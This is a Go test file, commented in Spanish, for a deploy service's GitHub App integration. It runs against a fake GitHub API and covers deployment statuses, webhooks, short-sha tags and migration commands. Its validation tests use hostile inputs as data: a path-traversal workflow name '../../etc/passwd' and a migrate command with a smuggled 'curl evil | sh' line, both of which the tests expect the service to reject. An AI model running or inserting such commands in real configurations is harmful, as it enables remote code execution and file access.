package http

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/golang-jwt/jwt/v5"

	"github.com/guz-studio/cac/backend/internal/core/domain"
	"github.com/guz-studio/cac/backend/internal/core/events"
	"github.com/guz-studio/cac/backend/internal/core/repository"
	"github.com/guz-studio/cac/backend/internal/core/service"
)

/*
La App escribe en GitHub (R6): cada deploy de un servicio con repo es un
Deployment en GitHub que sigue su estado, el workflow que publica la imagen
cuenta como el aviso del CI, y un deploy que sale bien deja una línea en las
tareas que trae.

Contra un GitHub falso que comprueba el JWT de la App con su llave pública y
apunta cada llamada.
*/

const appID = 4242

type fakeGitHub struct {
	t     *testing.T
	key   *rsa.PrivateKey
	mu    sync.Mutex
	calls []string
	// lo que llegó en cada llamada que importa
	tokens      int
	deployments []map[string]any
	statuses    []string
	badJWT      []string
}

func (g *fakeGitHub) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	g.mu.Lock()
	defer g.mu.Unlock()
	g.calls = append(g.calls, r.Method+" "+r.URL.Path)
	body, _ := io.ReadAll(r.Body)
	switch {
	case r.Method == http.MethodPost && r.URL.Path == "/app/installations/5/access_tokens":
		g.tokens++
		raw := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		claims := &jwt.RegisteredClaims{}
		tok, err := jwt.ParseWithClaims(raw, claims, func(t *jwt.Token) (any, error) {
			if t.Method != jwt.SigningMethodRS256 {
				return nil, fmt.Errorf("alg %v", t.Header["alg"])
			}
			return &g.key.PublicKey, nil
		})
		switch {
		case err != nil || !tok.Valid:
			g.badJWT = append(g.badJWT, fmt.Sprint(err))
		case claims.Issuer != fmt.Sprint(appID):
			g.badJWT = append(g.badJWT, "iss "+claims.Issuer)
		case claims.ExpiresAt.Sub(claims.IssuedAt.Time) > 10*time.Minute:
			g.badJWT = append(g.badJWT, "dura más de diez minutos")
		}
		w.WriteHeader(http.StatusCreated)
		fmt.Fprintf(w, `{"token":"ghs_prueba","expires_at":%q}`, time.Now().Add(time.Hour).Format(time.RFC3339))
	case r.Header.Get("Authorization") != "token ghs_prueba":
		w.WriteHeader(http.StatusUnauthorized)
	case r.Method == http.MethodPost && r.URL.Path == "/repos/dwit/api/deployments":
		var m map[string]any
		json.Unmarshal(body, &m)
		g.deployments = append(g.deployments, m)
		w.WriteHeader(http.StatusCreated)
		io.WriteString(w, `{"id":77}`)
	case r.Method == http.MethodPost && r.URL.Path == "/repos/dwit/api/deployments/77/statuses":
		var m map[string]any
		json.Unmarshal(body, &m)
		g.statuses = append(g.statuses, fmt.Sprint(m["state"]))
		w.WriteHeader(http.StatusCreated)
		io.WriteString(w, `{}`)
	case strings.HasPrefix(r.URL.Path, "/repos/dwit/api/compare/"):
		io.WriteString(w, `{"commits":[{"commit":{"message":"fix: el login cac#12"}},{"commit":{"message":"chore"}}]}`)
	case strings.HasPrefix(r.URL.Path, "/repos/dwit/api/commits/"):
		// Como GitHub: un sha corto se resuelve al entero que empieza así.
		asked := strings.TrimPrefix(r.URL.Path, "/repos/dwit/api/commits/")
		full := ""
		for _, sha := range []string{shaNew, shaOld} {
			if strings.HasPrefix(sha, asked) {
				full = sha
			}
		}
		if full == "" {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		fmt.Fprintf(w, `{"sha":%q,"commit":{"message":"primero cac#12"}}`, full)
	default:
		w.WriteHeader(http.StatusNotFound)
	}
}

type appFixture struct {
	*ghFixture
	gh      *fakeGitHub
	deploys *service.DeployService
	d       *domain.Deployable
}

const (
	shaNew = "abc1234def5678abc1234def5678abc1234def56"
	shaOld = "0000000def5678abc1234def5678abc1234def56"
)

// Sobre el fixture de la R5 (repo 100 = dwit/api, de la org-1, enlazado a sp-1):
// un servidor con agente v3 y un servicio de ese repo, que publica con prod.yml.
func appSetup(t *testing.T, mode string) (*appFixture, func()) {
	t.Helper()
	f, cleanup := githubSetup(t)
	if err := f.db.AutoMigrate(&domain.Organization{}, &domain.Server{}, &domain.Deployable{}, &domain.Deployment{}, &domain.ImageBuild{}); err != nil {
		t.Fatal(err)
	}
	if err := repository.EnsureDeployIndexes(f.db); err != nil {
		t.Fatal(err)
	}
	now := time.Now()
	f.db.Exec(`INSERT INTO servers (id, org_id, name, host, ssh_port, ssh_user, type, agent_port, status, agent_version, created_at, updated_at)
		VALUES ('srv-1','org-1','tds','10.0.0.1',22,'root','docker-swarm',9090,'online',3,?,?)`, now, now)

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	fake := &fakeGitHub{t: t, key: key}
	api := httptest.NewServer(fake)
	t.Cleanup(api.Close)

	gh := service.NewGitHubService(repository.NewGitHubRepository(f.db),
		service.GitHubConfig{AppSlug: "cac-test", WebhookSecret: ghSecret}, events.NewHub()).
		WithApp(service.GitHubAppKey{AppID: appID, Key: key, APIURL: api.URL}).Sync()
	r := chi.NewRouter()
	InitServerRoutesWith(f.db, r, events.NewHub(), gh)
	InitGitHubRoutesWith(r, gh)
	f.r = r

	deployRepo := repository.NewDeployRepository(f.db)
	deploys := service.NewDeployService(deployRepo, repository.NewServerRepository(f.db), nil).WithObserver(gh)
	gh.WithDeploys(deploys, deployRepo)
	srv, _ := service.NewServerService(repository.NewServerRepository(f.db)).Find("srv-1")
	d, err := deploys.CreateDeployable(srv, domain.CreateDeployableRequest{
		Name: "api", Stack: "beta", ServiceName: "beta_app", ImageRepo: "ghcr.io/dwit/api", Environment: "prod",
	})
	if err != nil {
		t.Fatal(err)
	}
	wf := "prod.yml"
	if d, err = deploys.UpdateDeployable(d, domain.UpdateDeployableRequest{
		Name: "api", Environment: "prod", RepoFullName: "dwit/api", OnCINotify: mode, BuildWorkflow: &wf,
	}); err != nil {
		t.Fatal(err)
	}
	return &appFixture{ghFixture: f, gh: fake, deploys: deploys, d: d}, cleanup
}

// El agente recoge el deploy y lo cierra.
func (f *appFixture) run(t *testing.T, sha string, status, previous string) *domain.Deployment {
	t.Helper()
	dep, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", sha, "")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.deploys.Claim("srv-1"); err != nil {
		t.Fatal(err)
	}
	if err := f.deploys.Finish("srv-1", dep.ID, domain.AgentFinishRequest{
		Status: status, PreviousImage: previous, FinalImage: "ghcr.io/dwit/api:" + sha,
	}); err != nil {
		t.Fatal(err)
	}
	return dep
}

// Un deploy que sale bien es un Deployment en GitHub, del commit desplegado y
// en su entorno, que pasa por «en curso» y acaba en «success». La App se
// identifica con un JWT RS256 corto, y su token se reutiliza.
func TestADeployIsFollowedInGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	dep := f.run(t, shaNew, domain.DeploySucceeded, "ghcr.io/dwit/api:"+shaOld)

	if len(f.gh.badJWT) > 0 {
		t.Fatalf("el JWT de la App no es el que pide GitHub: %v", f.gh.badJWT)
	}
	if len(f.gh.deployments) != 1 {
		t.Fatalf("%d Deployments en GitHub, se esperaba 1 (llamadas: %v)", len(f.gh.deployments), f.gh.calls)
	}
	got := f.gh.deployments[0]
	if got["ref"] != shaNew || got["environment"] != "prod" || got["auto_merge"] != false {
		t.Errorf("el Deployment no es del commit y entorno del deploy: %v", got)
	}
	if strings.Join(f.gh.statuses, ",") != "in_progress,success" {
		t.Errorf("estados en GitHub: %v, se esperaba in_progress,success", f.gh.statuses)
	}
	if f.gh.tokens != 1 {
		t.Errorf("%d tokens de instalación pedidos para un deploy, se esperaba 1", f.gh.tokens)
	}
	var stored domain.Deployment
	f.db.First(&stored, "id = ?", dep.ID)
	if stored.GitHubDeploymentID != 77 {
		t.Errorf("el deploy no guardó su Deployment de GitHub: %d", stored.GitHubDeploymentID)
	}
}

// Un deploy que sale bien deja en las tareas que traen sus commits —los de
// entre lo que había y lo nuevo— una línea interna, una sola vez.
func TestADeployTellsTheTasksItShips(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	f.run(t, shaNew, domain.DeploySucceeded, "ghcr.io/dwit/api:"+shaOld)
	var lines []domain.ItemComment
	f.db.Where("item_id = 'it-1' AND source_key LIKE 'deploy:%'").Find(&lines)
	if len(lines) != 1 {
		t.Fatalf("%d líneas de deploy en la tarea, se esperaba 1", len(lines))
	}
	if lines[0].Visibility != domain.VisibilityInternal || !strings.Contains(lines[0].Body, "deploy `abc1234` → prod") {
		t.Errorf("la línea no es la de un deploy interno: %+v", lines[0])
	}
	compared := false
	for _, c := range f.gh.calls {
		compared = compared || c == "GET /repos/dwit/api/compare/"+shaOld+"..."+shaNew
	}
	if !compared {
		t.Errorf("no se compararon los commits de antes y de ahora: %v", f.gh.calls)
	}
}

// Uno que falla acaba en «failure», y no le cuenta a ninguna tarea que ya
// está desplegada.
func TestAFailedDeployIsAFailureInGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	f.run(t, shaNew, domain.DeployFailed, "")
	if strings.Join(f.gh.statuses, ",") != "in_progress,failure" {
		t.Errorf("estados en GitHub: %v, se esperaba in_progress,failure", f.gh.statuses)
	}
	var n int64
	f.db.Model(&domain.ItemComment{}).Where("source_key LIKE 'deploy:%'").Count(&n)
	if n != 0 {
		t.Errorf("un deploy fallido dejó %d líneas de «desplegado»", n)
	}
}

// Un deploy al que se le murió el agente caduca, y en GitHub también: si no, se
// quedaría «en curso» para siempre.
func TestAnExpiredDeployIsAFailureInGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	dep, _, _ := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, "")
	f.deploys.Claim("srv-1")
	f.db.Model(&domain.Deployment{}).Where("id = ?", dep.ID).Update("started_at", time.Now().Add(-time.Hour))
	f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaOld, "")
	if !strings.HasPrefix(strings.Join(f.gh.statuses, ","), "in_progress,failure") {
		t.Errorf("estados en GitHub: %v, se esperaba que el caducado acabara en failure", f.gh.statuses)
	}
}

// Sin repo en el servicio, o con el de otra org que se llame igual, no se
// escribe nada en GitHub.
func TestOnlyAServiceWithItsOrgsRepoWritesToGitHub(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	wf := ""
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", BuildWorkflow: &wf})
	f.run(t, shaNew, domain.DeploySucceeded, "")
	f.db.Model(&domain.GitHubRepo{}).Where("repo_id = 100").Update("org_id", "org-2")
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "record"})
	f.run(t, shaOld, domain.DeploySucceeded, "")
	if len(f.gh.calls) != 0 {
		t.Errorf("se escribió en GitHub sin un repo de la org: %v", f.gh.calls)
	}
}

func workflowRun(path, conclusion string) string {
	return fmt.Sprintf(`{"action":"completed","repository":{"id":100,"full_name":"dwit/api"},"workflow_run":{
		"conclusion":%q,"path":%q,"head_sha":%q,"head_branch":"main","html_url":"https://github.com/dwit/api/actions/runs/9",
		"actor":{"login":"ana"}}}`, conclusion, path, shaNew)
}

// El workflow que publica la imagen, cuando acaba bien, cuenta como el aviso
// del CI: el build queda y, en modo `deploy`, se despliega. Otro workflow, o uno
// que falló, no cuenta.
func TestTheBuildWorkflowCountsAsTheCINotice(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	f.hook(t, "workflow_run", "d-1", workflowRun(".github/workflows/tests.yml", "success"))
	f.hook(t, "workflow_run", "d-2", workflowRun(".github/workflows/prod.yml", "failure"))
	var builds, deps int64
	f.db.Model(&domain.ImageBuild{}).Count(&builds)
	if builds != 0 {
		t.Fatalf("%d builds de un workflow que no publica o que falló", builds)
	}
	f.hook(t, "workflow_run", "d-3", workflowRun(".github/workflows/prod.yml", "success"))
	var b domain.ImageBuild
	f.db.First(&b)
	if b.Sha != shaNew || b.Source != "github" || b.RunURL != "https://github.com/dwit/api/actions/runs/9" {
		t.Errorf("el build no es el del workflow: %+v", b)
	}
	f.db.Model(&domain.Deployment{}).Where("requested_by = ?", domain.DeployByGitHub).Count(&deps)
	if deps != 1 {
		t.Errorf("en modo deploy, %d deploys pedidos por GitHub; se esperaba 1", deps)
	}
}

// Un repo de otra org con el mismo nombre no avisa a este servicio.
func TestAWorkflowOfAnotherOrgsRepoIsIgnored(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	f.db.Model(&domain.GitHubRepo{}).Where("repo_id = 100").Update("org_id", "org-2")
	f.hook(t, "workflow_run", "d-1", workflowRun(".github/workflows/prod.yml", "success"))
	var builds int64
	f.db.Model(&domain.ImageBuild{}).Count(&builds)
	if builds != 0 {
		t.Errorf("un workflow del repo de otra org dejó %d builds", builds)
	}
}

// Una app anterior a la R6 no manda `buildWorkflow`, y el PATCH pide la fila
// entera: cambiar de modo desde ella no puede borrar el workflow. Y un repo o
// un workflow que no tienen forma de serlo se rechazan.
func TestUpdatingADeployableKeepsWhatItDoesNotSend(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	d, err := f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "deploy"})
	if err != nil {
		t.Fatal(err)
	}
	var stored domain.Deployable
	f.db.First(&stored, "id = ?", d.ID)
	if stored.BuildWorkflow != "prod.yml" {
		t.Errorf("un PATCH sin buildWorkflow lo dejó en %q", stored.BuildWorkflow)
	}
	bad := "../../etc/passwd"
	for name, req := range map[string]domain.UpdateDeployableRequest{
		"repo sin dueño":    {Name: "api", RepoFullName: "api", OnCINotify: "record"},
		"repo con espacios": {Name: "api", RepoFullName: "dwit/a pi", OnCINotify: "record"},
		"workflow con ruta": {Name: "api", OnCINotify: "record", BuildWorkflow: &bad},
	} {
		if _, err := f.deploys.UpdateDeployable(f.d, req); err == nil {
			t.Errorf("%s: se aceptó", name)
		}
	}
}

// La llave de la App llega como la deja el `awk` de docs/integrations/github.md:
// en una línea, con los saltos escritos `\n`. Así tiene que leerse; y una que no
// es una llave deja la App sin escribir, no la tumba.
func TestTheAppKeyIsReadAsTheDocsSayToStoreIt(t *testing.T) {
	key, _ := rsa.GenerateKey(rand.Reader, 2048)
	pemText := string(pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)}))
	t.Setenv("GITHUB_APP_ID", "4242")
	t.Setenv("GITHUB_APP_PRIVATE_KEY", strings.ReplaceAll(strings.TrimSpace(pemText), "\n", `\n`))
	got := GitHubAppKeyFromEnv()
	if got.AppID != 4242 || got.Key == nil || !got.Key.Equal(key) {
		t.Fatalf("la llave en una línea no se leyó: id %d, llave %v", got.AppID, got.Key != nil)
	}
	t.Setenv("GITHUB_APP_PRIVATE_KEY", "no es una llave")
	if got := GitHubAppKeyFromEnv(); got.Key != nil || got.AppID != 0 {
		t.Errorf("una llave rota dejó la App con %+v", got)
	}
}

// Un servicio que su CI etiqueta con el sha corto (RRHH): GitHub avisa con el
// entero, y lo que se apunta y se despliega es el tag que existe, el corto. El
// mismo commit avisado por el curl con el corto es el mismo build. Y en GitHub
// el Deployment lleva el sha entero, que es lo que GitHub entiende.
func TestAShortTaggedServiceDeploysTheTagThatExists(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	short := true
	wf := "prod.yml"
	var err error
	if f.d, err = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{
		Name: "api", Environment: "prod", RepoFullName: "dwit/api", OnCINotify: "deploy", BuildWorkflow: &wf, ShortTags: &short,
	}); err != nil {
		t.Fatal(err)
	}
	f.hook(t, "workflow_run", "d-1", workflowRun(".github/workflows/prod.yml", "success"))
	if _, err := f.deploys.Notice(f.d, domain.DeployNotice{Sha: shaNew[:7]}, "ci"); err != nil {
		t.Fatal(err)
	}
	var builds []domain.ImageBuild
	f.db.Find(&builds)
	if len(builds) != 1 || builds[0].Sha != shaNew[:7] || builds[0].Image != "ghcr.io/dwit/api:"+shaNew[:7] {
		t.Fatalf("builds: %+v; se esperaba uno, con el tag corto", builds)
	}
	var dep domain.Deployment
	f.db.First(&dep, "requested_by = ?", domain.DeployByGitHub)
	if dep.Image != "ghcr.io/dwit/api:"+shaNew[:7] {
		t.Errorf("se encoló %q, se esperaba el tag corto", dep.Image)
	}

	// El agente lo despliega: en GitHub, el Deployment es del sha entero.
	f.deploys.Claim("srv-1")
	if len(f.gh.deployments) != 1 || f.gh.deployments[0]["ref"] != shaNew {
		t.Errorf("el Deployment de GitHub no lleva el sha entero: %v", f.gh.deployments)
	}
}

// A mano, elegir un commit de la lista (entero) despliega su tag corto.
func TestAManualDeployOfAShortTaggedServiceUsesTheShortTag(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	short := true
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "record", ShortTags: &short})
	dep, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, "")
	if err != nil {
		t.Fatal(err)
	}
	if dep.Image != "ghcr.io/dwit/api:"+shaNew[:7] {
		t.Errorf("se encoló %q, se esperaba el tag corto", dep.Image)
	}
	// Y una app anterior, que no manda shortTags, no lo apaga.
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", RepoFullName: "dwit/api", OnCINotify: "deploy"})
	var stored domain.Deployable
	f.db.First(&stored, "id = ?", f.d.ID)
	if !stored.ShortTags {
		t.Error("un PATCH sin shortTags lo apagó")
	}
}

// Un servicio con migraciones: el comando viaja en el trabajo del agente, un
// agente que no sabe migrar no recibe el deploy (lo desplegaría sin migrar), y
// un aviso del CI en ese caso queda apuntado, no falla.
func TestAMigrationNeedsAnAgentThatMigrates(t *testing.T) {
	f, cleanup := appSetup(t, "deploy")
	defer cleanup()
	cmd := "npx prisma migrate deploy"
	var err error
	if f.d, err = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "deploy", MigrateCommand: &cmd}); err != nil {
		t.Fatal(err)
	}
	// El agente de la fixture es v3: no sabe migrar.
	if _, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaNew, ""); !errors.Is(err, service.ErrAgentCannotMigrate) {
		t.Fatalf("a un agente v3 con migraciones → %v", err)
	}
	res, err := f.deploys.Notice(f.d, domain.DeployNotice{Sha: shaNew}, "ci")
	if err != nil || res.Deploy != "skipped" || res.Reason != "agent-cannot-migrate" {
		t.Errorf("un aviso con un agente que no migra: %+v %v", res, err)
	}

	f.db.Exec("UPDATE servers SET agent_version = ?", domain.AgentVersionMigrates)
	if _, _, err := f.deploys.RequestDeploy(f.d, domain.DeployByUser, "u-1", shaOld, ""); err != nil {
		t.Fatal(err)
	}
	job, err := f.deploys.Claim("srv-1")
	if err != nil || job == nil {
		t.Fatalf("el agente v4 no recogió nada: %v", err)
	}
	if got := job.Data.MigrateCommand; got != cmd {
		t.Errorf("el trabajo lleva %q, se esperaba el comando", got)
	}
}

// El comando es una línea (va detrás de `sh -c`), y una app que no lo manda no
// lo borra.
func TestTheMigrateCommandIsOneLineAndSurvivesOldApps(t *testing.T) {
	f, cleanup := appSetup(t, "record")
	defer cleanup()
	two := "migrate\ncurl evil | sh"
	if _, err := f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", MigrateCommand: &two}); !errors.Is(err, service.ErrBadMigrateCommand) {
		t.Errorf("un comando de dos líneas → %v", err)
	}
	one := "  bun run migrate  "
	f.d, _ = f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "record", MigrateCommand: &one})
	f.deploys.UpdateDeployable(f.d, domain.UpdateDeployableRequest{Name: "api", OnCINotify: "deploy"})
	var stored domain.Deployable
	f.db.First(&stored, "id = ?", f.d.ID)
	if stored.MigrateCommand != "bun run migrate" {
		t.Errorf("el comando guardado es %q", stored.MigrateCommand)
	}
}
